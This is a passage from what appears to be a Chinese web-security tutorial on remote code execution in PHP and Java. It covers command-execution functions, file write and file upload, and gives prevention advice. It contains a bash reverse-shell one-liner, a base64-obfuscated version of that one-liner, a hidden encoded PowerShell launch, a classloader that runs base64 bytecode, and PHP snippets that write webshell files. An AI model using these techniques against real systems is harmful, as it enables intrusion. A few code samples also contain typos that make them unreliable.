class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$command3</span>,<span class="hljs-variable">$arguments</span>);<br><span class="hljs-comment">//usort</span><br><span class="hljs-variable">$command4</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>];<br><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$commnand4</span>,<span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-comment">//array_filter</span><br><span class="hljs-variable">$command5</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_filter</span>(command5,<span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JAVA基础命令-代码执行函数"><a href="#JAVA基础命令-代码执行函数" class="headerlink" title="JAVA基础命令&#x2F;代码执行函数"></a>JAVA基础命令&#x2F;代码执行函数</h3><p>JAVA下直接执行<strong>系统命令</strong>的函数如下</p><h4 id="Runtime-getRuntime-exec"><a href="#Runtime-getRuntime-exec" class="headerlink" title="Runtime.getRuntime().exec"></a>Runtime.getRuntime().exec</h4><p><strong>注意！！！</strong></p><p>但与php不同的是，java会将其中的参数当成一整个字符串来执行，而不会受到shell符号的影响</p><p><code>Runtime.exec</code>类型的RCE如果要反弹shell需要特殊处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">原命令：<br>bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">12345</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>处理后：<br>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNDUgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><p>对于powershell应该是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc YwBhAGwAYwAuAGUAeABlAA==<br></code></pre></td></tr></table></figure><h4 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h4><p>这个函数与<code>Runtime.getRuntime().exec</code>区别在于它是传参更加方便，并且它允许更精细的控制进程的创建，包括环境变量的设置、工作目录的改变以及更复杂的输入输出处理</p><p>Java代码执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;ping&quot;</span> , <span class="hljs-string">&quot;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注意！！！</strong></p><p>代码执行相当于字节码执行，一个弹计算器的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Main</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后使用<code>javac Main.java</code>编译成字节码文件</p><p>使用下面的代码进行base64编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">compile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C://Users//95658//Desktop//ctf_challenges-master//Test1//src//Main.class&quot;</span>);<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> n;<br>        <span class="hljs-keyword">while</span> ((n = fis.read(buf)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(buf, <span class="hljs-number">0</span>, n);        &#125;<br>        fis.close();<br>        <span class="hljs-type">byte</span>[] classBytes = baos.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(classBytes);<br>        System.out.println(base64);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用下面的代码来解码base64后，使用我们自定义的类加载器执行我们的字节码，可以看到成功的执行了calc弹出计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Excute</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">base64ClassString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAAD0AHAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEABGNhbGMKAAgAEAwAEQASAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwcAFAEABE1haW4BAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAGQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAApTb3VyY2VGaWxlAQAJTWFpbi5qYXZhACEAEwACAAAAAAABAAEABQAGAAIAFQAAAC4AAgABAAAADiq3AAG4AAcSDbYAD1exAAAAAQAWAAAADgADAAAAAgAEAAMADQAEABcAAAAEAAEAGAABABoAAAACABs=&quot;</span>;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] classBytes = Base64.getDecoder().decode(base64ClassString);<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">customClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Main&quot;</span>.equals(name)) &#123;<br>                    <span class="hljs-keyword">return</span> defineClass(name, classBytes, <span class="hljs-number">0</span>, classBytes.length);<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.findClass(name);<br>            &#125;<br>        &#125;;<br>        <span class="hljs-comment">// 使用自定义的类加载器来加载我们的Test类</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;Main&quot;</span>, <span class="hljs-literal">true</span>, customClassLoader);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor().newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="修复-预防方案"><a href="#修复-预防方案" class="headerlink" title="修复&#x2F;预防方案"></a>修复&#x2F;预防方案</h3><p>使用安全的过滤函数，例如：<code>escapeshellarg</code>或<code>escapeshellcmd</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;|whoami&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo 1&quot;</span>.<span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo 1&quot;</span>.<span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo 1&quot;</span>.<span class="hljs-variable">$test</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>白名单</code>命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$allowed_commands</span> = [<span class="hljs-string">&#x27;dir&#x27;</span>,<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-string">&#x27;echo&#x27;</span>];<br><span class="hljs-variable">$command1</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br><span class="hljs-variable">$command2</span> = <span class="hljs-string">&quot;ipconfig&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$command1</span>,<span class="hljs-variable">$allowed_commands</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$command1</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$command2</span> , <span class="hljs-variable">$allowed_commands</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$command2</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过正则表达式，只运行<code>字母</code>和<code>数字</code>通过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test1</span> = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br><span class="hljs-variable">$test2</span> = <span class="hljs-string">&#x27;whoami|whoami&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-zA-Z0-9]+$/&#x27;</span>, <span class="hljs-variable">$test1</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$test1</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-zA-Z0-9]+$/&#x27;</span>, <span class="hljs-variable">$test2</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$test2</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>而java当中没有php的安全函数，但他本身的命令传参就会防止特殊符号。所以用正则进行控制即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">userInput</span> <span class="hljs-operator">=</span> ...; <span class="hljs-comment">// 从用户或外部源获取的输入</span><br><span class="hljs-keyword">if</span> (!userInput.matches(<span class="hljs-string">&quot;[a-zA-Z0-9]+&quot;</span>)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;不合法的输入&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="任意文件写入导致RCE"><a href="#任意文件写入导致RCE" class="headerlink" title="任意文件写入导致RCE"></a>任意文件写入导致RCE</h2><p>任意文件写入漏洞（Arbitrary File Write Vulnerability），它允许攻击者将数据写入服务器上的文件，甚至创建新文件。这种漏洞通常发生在应用程序不正确地处理文件写入操作时</p><h3 id="PHP任意文件写入方式"><a href="#PHP任意文件写入方式" class="headerlink" title="PHP任意文件写入方式"></a>PHP任意文件写入方式</h3><h4 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h4><p>这个函数用于简单地将一个字符串写入文件，如果文件不存在会尝试创建它。它是一个高级别的操作，相当于依次调用 fopen, fwrite, 和 fclose。可以指定标志来决定是否追加数据到文件或者是覆盖原有的数据。适用于快速简单地写入数据到文件</p><h4 id="fwrite-fputs"><a href="#fwrite-fputs" class="headerlink" title="fwrite&#x2F;fputs"></a>fwrite&#x2F;fputs</h4><p>fwrite与fputs函数用法完全相同</p><p>这个函数用于向一个打开的文件流（例如通过 fopen 获得的资源）写入数据。需要更细粒度的控制文件操作时（例如，持续写入数据到同一个文件），fwrite 更加适用。用于写入数据之前，必须先用 fopen 打开文件并获得文件指针</p><h4 id="fprintf"><a href="#fprintf" class="headerlink" title="fprintf"></a>fprintf</h4><p>类似于 fwrite，但它提供了格式化功能，类似于 printf 函数。允许你按照特定的格式将数据写入到文件流。同样需要一个通过 fopen 打开的文件指针。适用于需要按照特定格式写入数据的场景</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//file_put_contents</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;test1.php&#x27;</span>,<span class="hljs-string">&quot;&lt;?php system(&#x27;whoami&#x27;)?&gt;&quot;</span>);<br><br><span class="hljs-comment">//fwite/fputs</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;test2.php&quot;</span> , <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;&lt;?php system(&#x27;whoami&#x27;)?&gt;&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-comment">//fprintf</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;test3.php&quot;</span> , <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-title function_ invoke__">fprintf</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;&lt;?php stsrem(&#x27;whoami&#x27;)?&gt;&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JAVA任意文件写入方式"><a href="#JAVA任意文件写入方式" class="headerlink" title="JAVA任意文件写入方式"></a>JAVA任意文件写入方式</h3><h4 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h4><p>其是一个用于写入字节到文件的输出流类。它直接写入字节，因此非常适合处理二进制数据，如图像和音频文件。它直接与底层操作系统的文件写入机制交互，没有内置的缓冲机制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test1.jsp&quot;</span>))&#123;<br>            <span class="hljs-type">byte</span>[] bytes = data.getBytes();<br>            fos.write(bytes);<br>        &#125;<span class="hljs-keyword">catch</span>(IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="BufferedOutputStream"><a href="#BufferedOutputStream" class="headerlink" title="BufferedOutputStream"></a>BufferedOutputStream</h4><p><code>BufferedOutputStream</code> 是 <code>OutputStream</code> 的一个子类，它添加了缓冲功能。这意味着数据首先被写入到内存缓冲区，当缓冲区满时，数据才会写入文件。这可以提高文件写入的效率，特别是在多次写入小量数据的场景中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test.jsp&quot;</span>));<br>             <span class="hljs-type">OutputStreamWriter</span> <span class="hljs-variable">osw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(bos, <span class="hljs-string">&quot;UTF-8&quot;</span>)) &#123;<br>            osw.write(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="FileWriter"><a href="#FileWriter" class="headerlink" title="FileWriter"></a>FileWriter</h4><p>FileWriter 用于写入字符数据到文件。它是写入文本数据的便捷方式，特别是当数据是字符串时。它直接将字符数据转换为字节，并写入到文件中。因此，它更适合处理文本数据。FileWriter 基于默认的字符编码。要指定不同的编码，可能需要使用 <code>OutputStreamWriter</code> 与 <code>FileOutputStream</code> 的组合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;test3.jsp&quot;</span>))&#123;<br>            writer.write(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Files-write"><a href="#Files-write" class="headerlink" title="Files.write"></a>Files.write</h4><p>Files.write是Java NIO包中的一个高级方法，用于以简单、直接的方式将字节序列写入文件。它自动处理文件的打开和关闭，避免了手动管理底层资源。内部实现上，Files.write提供了缓冲机制，能够有效提升写入性能，适用于写入文本或二进制数据。此方法支持一次性写入所有内容，使得文件操作既高效又易于使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test4.jsp&quot;</span>;<br>            List&lt;String&gt; lines = Arrays.asList(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>            Files.write(Paths.get(filePath), lines, StandardCharsets.UTF_8);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="修复-预防方案-1"><a href="#修复-预防方案-1" class="headerlink" title="修复&#x2F;预防方案"></a>修复&#x2F;预防方案</h3><p>PHP：可以使用安全过滤函数，禁止写入敏感代码，例如strip_tags可以移除php标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> ;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;E://Code//Test_RCE&quot;</span>,<span class="hljs-variable">$content</span>.<span class="hljs-string">&quot;\n&quot;</span>,FILE_APPEND);<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;E://Code//Test_RCE&quot;</span>,<span class="hljs-string">&quot;Defense&quot;</span>.<span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$content</span>),FILE_APPEND);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>路径验证：在应用程序中对文件路径进行验证，确保用户提供的文件路径是受信任且合法的。不要直接使用用户提供的路径来写入文件，而是应该使用相对路径或者将用户提供的路径与预定义的安全路径进行组合</li><li>权限控制：确保应用程序以最低权限执行，限制其对文件系统的写入权限。在操作系统级别，确保文件系统权限设置正确，应用程序只能写入其必要的目录，并且仅有必要的权限</li><li>文件名随机化：在写入文件时，使用随机生成的文件名而不是用户提供的文件名。这可以防止攻击者直接访问写入的文件</li><li>白名单验证：对于涉及到写入文件的操作，应该使用白名单验证来限制写入的文件类型和目录。只允许应用程序写入预定义的安全目录，并且只允许写入特定类型的文件</li></ul><h2 id="文件上传导致RCE"><a href="#文件上传导致RCE" class="headerlink" title="文件上传导致RCE"></a>文件上传导致RCE</h2><p>文件上传漏洞（File Upload Vulnearability），通常发生在Web应用程序中，尤其是那些允许用户上传文件的地方。这种漏洞的本质在于，应用程序在处理上传的文件时没有充分验证或限制，从而允许攻击者上传恶意文件</p><h3 id="PHP任意文件上传方式"><a href="#PHP任意文件上传方式" class="headerlink" title="PHP任意文件上传方式"></a>PHP任意文件上传方式</h3><p>PHP只有<code>move_uploaded_file</code>函数负责文件上传，用法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-keyword">string</span><span class="hljs-variable">$from</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$to</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p>参数设置：<code>$from</code>上传的文件的文件名，<code>$to</code>移动文件到这个位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;文件上传测试表单&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form action=<span class="hljs-string">&quot;1.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    